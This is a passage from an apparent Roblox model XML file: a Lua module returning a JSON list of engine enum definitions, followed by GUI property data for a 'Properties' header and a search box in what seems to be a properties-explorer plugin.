,"Name":"8","tags":[],"Value":8,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PyramidSides"},{"type":"Enum","Name":"QualityLevel","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level01","tags":[],"Value":1,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level02","tags":[],"Value":2,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level03","tags":[],"Value":3,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level04","tags":[],"Value":4,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level05","tags":[],"Value":5,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level06","tags":[],"Value":6,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level07","tags":[],"Value":7,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level08","tags":[],"Value":8,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level09","tags":[],"Value":9,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level10","tags":[],"Value":10,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level11","tags":[],"Value":11,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level12","tags":[],"Value":12,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level13","tags":[],"Value":13,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level14","tags":[],"Value":14,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level15","tags":[],"Value":15,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level16","tags":[],"Value":16,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level17","tags":[],"Value":17,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level18","tags":[],"Value":18,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level19","tags":[],"Value":19,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level20","tags":[],"Value":20,"Enum":"QualityLevel"},{"type":"EnumItem","Name":"Level21","tags":[],"Value":21,"Enum":"QualityLevel"},{"type":"Enum","Name":"RenderPriority","tags":[]},{"type":"EnumItem","Name":"First","tags":[],"Value":0,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Input","tags":[],"Value":100,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Camera","tags":[],"Value":200,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Character","tags":[],"Value":300,"Enum":"RenderPriority"},{"type":"EnumItem","Name":"Last","tags":[],"Value":2000,"Enum":"RenderPriority"},{"type":"Enum","Name":"Resolution","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Resolution"},{"type":"EnumItem","Name":"720x526","tags":[],"Value":1,"Enum":"Resolution"},{"type":"EnumItem","Name":"800x600","tags":[],"Value":2,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x600","tags":[],"Value":3,"Enum":"Resolution"},{"type":"EnumItem","Name":"1024x768","tags":[],"Value":4,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x720","tags":[],"Value":5,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x768","tags":[],"Value":6,"Enum":"Resolution"},{"type":"EnumItem","Name":"1152x864","tags":[],"Value":7,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x800","tags":[],"Value":8,"Enum":"Resolution"},{"type":"EnumItem","Name":"1360x768","tags":[],"Value":9,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x960","tags":[],"Value":10,"Enum":"Resolution"},{"type":"EnumItem","Name":"1280x1024","tags":[],"Value":11,"Enum":"Resolution"},{"type":"EnumItem","Name":"1440x900","tags":[],"Value":12,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x900","tags":[],"Value":13,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1024","tags":[],"Value":14,"Enum":"Resolution"},{"type":"EnumItem","Name":"1600x1200","tags":[],"Value":15,"Enum":"Resolution"},{"type":"EnumItem","Name":"1680x1050","tags":[],"Value":16,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1080","tags":[],"Value":17,"Enum":"Resolution"},{"type":"EnumItem","Name":"1920x1200","tags":[],"Value":18,"Enum":"Resolution"},{"type":"Enum","Name":"ReverbType","tags":[]},{"type":"EnumItem","Name":"NoReverb","tags":[],"Value":0,"Enum":"ReverbType"},{"type":"EnumItem","Name":"GenericReverb","tags":[],"Value":1,"Enum":"ReverbType"},{"type":"EnumItem","Name":"PaddedCell","tags":[],"Value":2,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Room","tags":[],"Value":3,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Bathroom","tags":[],"Value":4,"Enum":"ReverbType"},{"type":"EnumItem","Name":"LivingRoom","tags":[],"Value":5,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneRoom","tags":[],"Value":6,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Auditorium","tags":[],"Value":7,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ConcertHall","tags":[],"Value":8,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Cave","tags":[],"Value":9,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Arena","tags":[],"Value":10,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hangar","tags":[],"Value":11,"Enum":"ReverbType"},{"type":"EnumItem","Name":"CarpettedHallway","tags":[],"Value":12,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Hallway","tags":[],"Value":13,"Enum":"ReverbType"},{"type":"EnumItem","Name":"StoneCorridor","tags":[],"Value":14,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Alley","tags":[],"Value":15,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Forest","tags":[],"Value":16,"Enum":"ReverbType"},{"type":"EnumItem","Name":"City","tags":[],"Value":17,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Mountains","tags":[],"Value":18,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Quarry","tags":[],"Value":19,"Enum":"ReverbType"},{"type":"EnumItem","Name":"Plain","tags":[],"Value":20,"Enum":"ReverbType"},{"type":"EnumItem","Name":"ParkingLot","tags":[],"Value":21,"Enum":"ReverbType"},{"type":"EnumItem","Name":"SewerPipe","tags":[],"Value":22,"Enum":"ReverbType"},{"type":"EnumItem","Name":"UnderWater","tags":[],"Value":23,"Enum":"ReverbType"},{"type":"Enum","Name":"RollOffMode","tags":[]},{"type":"EnumItem","Name":"Inverse","tags":[],"Value":0,"Enum":"RollOffMode"},{"type":"EnumItem","Name":"Linear","tags":[],"Value":1,"Enum":"RollOffMode"},{"type":"Enum","Name":"RotationType","tags":[]},{"type":"EnumItem","Name":"MovementRelative","tags":[],"Value":0,"Enum":"RotationType"},{"type":"EnumItem","Name":"CameraRelative","tags":[],"Value":1,"Enum":"RotationType"},{"type":"Enum","Name":"RuntimeUndoBehavior","tags":[]},{"type":"EnumItem","Name":"Aggregate","tags":[],"Value":0,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Snapshot","tags":[],"Value":1,"Enum":"RuntimeUndoBehavior"},{"type":"EnumItem","Name":"Hybrid","tags":[],"Value":2,"Enum":"RuntimeUndoBehavior"},{"type":"Enum","Name":"SaveFilter","tags":[]},{"type":"EnumItem","Name":"SaveAll","tags":[],"Value":2,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveWorld","tags":[],"Value":0,"Enum":"SaveFilter"},{"type":"EnumItem","Name":"SaveGame","tags":[],"Value":1,"Enum":"SaveFilter"},{"type":"Enum","Name":"SavedQualitySetting","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel1","tags":[],"Value":1,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel2","tags":[],"Value":2,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel3","tags":[],"Value":3,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel4","tags":[],"Value":4,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel5","tags":[],"Value":5,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel6","tags":[],"Value":6,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel7","tags":[],"Value":7,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel8","tags":[],"Value":8,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel9","tags":[],"Value":9,"Enum":"SavedQualitySetting"},{"type":"EnumItem","Name":"QualityLevel10","tags":[],"Value":10,"Enum":"SavedQualitySetting"},{"type":"Enum","Name":"ScaleType","tags":[]},{"type":"EnumItem","Name":"Stretch","tags":[],"Value":0,"Enum":"ScaleType"},{"type":"EnumItem","Name":"Slice","tags":[],"Value":1,"Enum":"ScaleType"},{"type":"Enum","Name":"SizeConstraint","tags":[]},{"type":"EnumItem","Name":"RelativeXY","tags":[],"Value":0,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeXX","tags":[],"Value":1,"Enum":"SizeConstraint"},{"type":"EnumItem","Name":"RelativeYY","tags":[],"Value":2,"Enum":"SizeConstraint"},{"type":"Enum","Name":"SleepAdjustMethod","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"LastSample","tags":[],"Value":1,"Enum":"SleepAdjustMethod"},{"type":"EnumItem","Name":"AverageInterval","tags":[],"Value":2,"Enum":"SleepAdjustMethod"},{"type":"Enum","Name":"SoundType","tags":[]},{"type":"EnumItem","Name":"NoSound","tags":[],"Value":0,"Enum":"SoundType"},{"type":"EnumItem","Name":"Boing","tags":[],"Value":1,"Enum":"SoundType"},{"type":"EnumItem","Name":"Bomb","tags":[],"Value":2,"Enum":"SoundType"},{"type":"EnumItem","Name":"Break","tags":[],"Value":3,"Enum":"SoundType"},{"type":"EnumItem","Name":"Click","tags":[],"Value":4,"Enum":"SoundType"},{"type":"EnumItem","Name":"Clock","tags":[],"Value":5,"Enum":"SoundType"},{"type":"EnumItem","Name":"Slingshot","tags":[],"Value":6,"Enum":"SoundType"},{"type":"EnumItem","Name":"Page","tags":[],"Value":7,"Enum":"SoundType"},{"type":"EnumItem","Name":"Ping","tags":[],"Value":8,"Enum":"SoundType"},{"type":"EnumItem","Name":"Snap","tags":[],"Value":9,"Enum":"SoundType"},{"type":"EnumItem","Name":"Splat","tags":[],"Value":10,"Enum":"SoundType"},{"type":"EnumItem","Name":"Step","tags":[],"Value":11,"Enum":"SoundType"},{"type":"EnumItem","Name":"StepOn","tags":[],"Value":12,"Enum":"SoundType"},{"type":"EnumItem","Name":"Swoosh","tags":[],"Value":13,"Enum":"SoundType"},{"type":"EnumItem","Name":"Victory","tags":[],"Value":14,"Enum":"SoundType"},{"type":"Enum","Name":"SpecialKey","tags":[]},{"type":"EnumItem","Name":"Insert","tags":[],"Value":0,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"Home","tags":[],"Value":1,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageUp","tags":[],"Value":3,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"PageDown","tags":[],"Value":4,"Enum":"SpecialKey"},{"type":"EnumItem","Name":"ChatHotkey","tags":[],"Value":5,"Enum":"SpecialKey"},{"type":"Enum","Name":"Status","tags":[]},{"type":"EnumItem","Name":"Poison","tags":["deprecated"],"Value":0,"Enum":"Status"},{"type":"EnumItem","Name":"Confusion","tags":["deprecated"],"Value":1,"Enum":"Status"},{"type":"Enum","Name":"Stuff","tags":[]},{"type":"EnumItem","Name":"Heads","tags":[],"Value":0,"Enum":"Stuff"},{"type":"EnumItem","Name":"Faces","tags":[],"Value":1,"Enum":"Stuff"},{"type":"EnumItem","Name":"Hats","tags":[],"Value":2,"Enum":"Stuff"},{"type":"EnumItem","Name":"TShirts","tags":[],"Value":3,"Enum":"Stuff"},{"type":"EnumItem","Name":"Shirts","tags":[],"Value":4,"Enum":"Stuff"},{"type":"EnumItem","Name":"Pants","tags":[],"Value":5,"Enum":"Stuff"},{"type":"EnumItem","Name":"Gears","tags":[],"Value":6,"Enum":"Stuff"},{"type":"EnumItem","Name":"Torsos","tags":[],"Value":7,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftArms","tags":[],"Value":8,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightArms","tags":[],"Value":9,"Enum":"Stuff"},{"type":"EnumItem","Name":"LeftLegs","tags":[],"Value":10,"Enum":"Stuff"},{"type":"EnumItem","Name":"RightLegs","tags":[],"Value":11,"Enum":"Stuff"},{"type":"EnumItem","Name":"Bodies","tags":[],"Value":12,"Enum":"Stuff"},{"type":"EnumItem","Name":"Costumes","tags":[],"Value":13,"Enum":"Stuff"},{"type":"Enum","Name":"Style","tags":[]},{"type":"EnumItem","Name":"AlternatingSupports","tags":[],"Value":0,"Enum":"Style"},{"type":"EnumItem","Name":"BridgeStyleSupports","tags":[],"Value":1,"Enum":"Style"},{"type":"EnumItem","Name":"NoSupports","tags":[],"Value":2,"Enum":"Style"},{"type":"Enum","Name":"SurfaceConstraint","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":1,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":2,"Enum":"SurfaceConstraint"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":3,"Enum":"SurfaceConstraint"},{"type":"Enum","Name":"SurfaceType","tags":[]},{"type":"EnumItem","Name":"Smooth","tags":[],"Value":0,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Glue","tags":[],"Value":1,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Weld","tags":[],"Value":2,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Studs","tags":[],"Value":3,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Inlet","tags":[],"Value":4,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Universal","tags":[],"Value":5,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Hinge","tags":[],"Value":6,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":7,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SteppingMotor","tags":[],"Value":8,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"Unjoinable","tags":[],"Value":9,"Enum":"SurfaceType"},{"type":"EnumItem","Name":"SmoothNoOutlines","tags":[],"Value":10,"Enum":"SurfaceType"},{"type":"Enum","Name":"SwipeDirection","tags":[]},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Left","tags":[],"Value":1,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Up","tags":[],"Value":2,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"Down","tags":[],"Value":3,"Enum":"SwipeDirection"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"SwipeDirection"},{"type":"Enum","Name":"TeleportState","tags":[]},{"type":"EnumItem","Name":"RequestedFromServer","tags":[],"Value":0,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Started","tags":[],"Value":1,"Enum":"TeleportState"},{"type":"EnumItem","Name":"WaitingForServer","tags":[],"Value":2,"Enum":"TeleportState"},{"type":"EnumItem","Name":"Failed","tags":[],"Value":3,"Enum":"TeleportState"},{"type":"EnumItem","Name":"InProgress","tags":[],"Value":4,"Enum":"TeleportState"},{"type":"Enum","Name":"TeleportType","tags":[]},{"type":"EnumItem","Name":"ToPlace","tags":[],"Value":0,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToInstance","tags":[],"Value":1,"Enum":"TeleportType"},{"type":"EnumItem","Name":"ToReservedServer","tags":[],"Value":2,"Enum":"TeleportType"},{"type":"Enum","Name":"TextXAlignment","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"TextXAlignment"},{"type":"EnumItem","Name":"Right","tags":[],"Value":1,"Enum":"TextXAlignment"},{"type":"Enum","Name":"TextYAlignment","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TextYAlignment"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TextYAlignment"},{"type":"Enum","Name":"ThreadPoolConfig","tags":[]},{"type":"EnumItem","Name":"Auto","tags":[],"Value":0,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore1","tags":[],"Value":101,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore2","tags":[],"Value":102,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore3","tags":[],"Value":103,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"PerCore4","tags":[],"Value":104,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads1","tags":[],"Value":1,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads2","tags":[],"Value":2,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads3","tags":[],"Value":3,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads4","tags":[],"Value":4,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads8","tags":[],"Value":8,"Enum":"ThreadPoolConfig"},{"type":"EnumItem","Name":"Threads16","tags":[],"Value":16,"Enum":"ThreadPoolConfig"},{"type":"Enum","Name":"ThrottlingPriority","tags":[]},{"type":"EnumItem","Name":"Extreme","tags":[],"Value":2,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"ElevatedOnServer","tags":[],"Value":1,"Enum":"ThrottlingPriority"},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ThrottlingPriority"},{"type":"Enum","Name":"TickCountSampleMethod","tags":[]},{"type":"EnumItem","Name":"Fast","tags":[],"Value":0,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Benchmark","tags":[],"Value":1,"Enum":"TickCountSampleMethod"},{"type":"EnumItem","Name":"Precise","tags":[],"Value":2,"Enum":"TickCountSampleMethod"},{"type":"Enum","Name":"TopBottom","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":0,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"TopBottom"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":2,"Enum":"TopBottom"},{"type":"Enum","Name":"TouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"TouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"TouchCameraMovementMode"},{"type":"Enum","Name":"TouchMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"TouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"TouchMovementMode"},{"type":"Enum","Name":"TweenStatus","tags":[]},{"type":"EnumItem","Name":"Canceled","tags":[],"Value":0,"Enum":"TweenStatus"},{"type":"EnumItem","Name":"Completed","tags":[],"Value":1,"Enum":"TweenStatus"},{"type":"Enum","Name":"UiMessageType","tags":[]},{"type":"EnumItem","Name":"UiMessageError","tags":[],"Value":0,"Enum":"UiMessageType"},{"type":"EnumItem","Name":"UiMessageInfo","tags":[],"Value":1,"Enum":"UiMessageType"},{"type":"Enum","Name":"UploadSetting","tags":[]},{"type":"EnumItem","Name":"Never","tags":[],"Value":0,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Ask","tags":[],"Value":1,"Enum":"UploadSetting"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"UploadSetting"},{"type":"Enum","Name":"UserCFrame","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":1,"Enum":"UserCFrame"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":2,"Enum":"UserCFrame"},{"type":"Enum","Name":"UserInputState","tags":[]},{"type":"EnumItem","Name":"Begin","tags":[],"Value":0,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Change","tags":[],"Value":1,"Enum":"UserInputState"},{"type":"EnumItem","Name":"End","tags":[],"Value":2,"Enum":"UserInputState"},{"type":"EnumItem","Name":"Cancel","tags":[],"Value":3,"Enum":"UserInputState"},{"type":"EnumItem","Name":"None","tags":[],"Value":4,"Enum":"UserInputState"},{"type":"Enum","Name":"UserInputType","tags":[]},{"type":"EnumItem","Name":"MouseButton1","tags":[],"Value":0,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton2","tags":[],"Value":1,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseButton3","tags":[],"Value":2,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseWheel","tags":[],"Value":3,"Enum":"UserInputType"},{"type":"EnumItem","Name":"MouseMovement","tags":[],"Value":4,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Touch","tags":[],"Value":7,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Keyboard","tags":[],"Value":8,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Focus","tags":[],"Value":9,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Accelerometer","tags":[],"Value":10,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gyro","tags":[],"Value":11,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad1","tags":[],"Value":12,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad2","tags":[],"Value":13,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad3","tags":[],"Value":14,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad4","tags":[],"Value":15,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad5","tags":[],"Value":16,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad6","tags":[],"Value":17,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad7","tags":[],"Value":18,"Enum":"UserInputType"},{"type":"EnumItem","Name":"Gamepad8","tags":[],"Value":19,"Enum":"UserInputType"},{"type":"EnumItem","Name":"TextInput","tags":[],"Value":20,"Enum":"UserInputType"},{"type":"EnumItem","Name":"None","tags":[],"Value":21,"Enum":"UserInputType"},{"type":"Enum","Name":"VibrationMotor","tags":[]},{"type":"EnumItem","Name":"Large","tags":[],"Value":0,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftTrigger","tags":[],"Value":2,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightTrigger","tags":[],"Value":3,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"LeftHand","tags":[],"Value":4,"Enum":"VibrationMotor"},{"type":"EnumItem","Name":"RightHand","tags":[],"Value":5,"Enum":"VibrationMotor"},{"type":"Enum","Name":"VideoQualitySettings","tags":[]},{"type":"EnumItem","Name":"LowResolution","tags":[],"Value":0,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"MediumResolution","tags":[],"Value":1,"Enum":"VideoQualitySettings"},{"type":"EnumItem","Name":"HighResolution","tags":[],"Value":2,"Enum":"VideoQualitySettings"},{"type":"Enum","Name":"WaterDirection","tags":[]},{"type":"EnumItem","Name":"NegX","tags":[],"Value":0,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegY","tags":[],"Value":2,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Y","tags":[],"Value":3,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":4,"Enum":"WaterDirection"},{"type":"EnumItem","Name":"Z","tags":[],"Value":5,"Enum":"WaterDirection"},{"type":"Enum","Name":"WaterForce","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Small","tags":[],"Value":1,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":2,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Strong","tags":[],"Value":3,"Enum":"WaterForce"},{"type":"EnumItem","Name":"Max","tags":[],"Value":4,"Enum":"WaterForce"}]
]===]

return function() return json end;
]]></ProtectedString>
							</Properties>
						</Item>
					</Item>
					<Item class="Frame" referent="RBX69DF94BD2A7C4D09AEDEEA7DB3EFD63E">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4293519849</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4287993237</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">Header</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>-36</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>35</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="TextLabel" referent="RBX3ABEDDD374AC4708BF2368CCA06EB976">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">TextLabel</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>4</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>-4</XO>
									<YS>0.5</YS>
									<YO>0</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">Properties</string>
								<Color3 name="TextColor3">4278190080</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="TextBox" referent="RBXC503C47659DE454984B8E3E55935C603">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">0.800000012</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClearTextOnFocus">true</bool>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<bool name="MultiLine">false</bool>
								<string name="Name">TextBox</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>4</XO>
									<YS>0.5</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<bool name="ShowNativeInput">true</bool>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>-8</XO>
									<YS>0.5</YS>
									<YO>-3</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">Search Properties</string>
								<Color3 name="TextColor3">4278190080</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
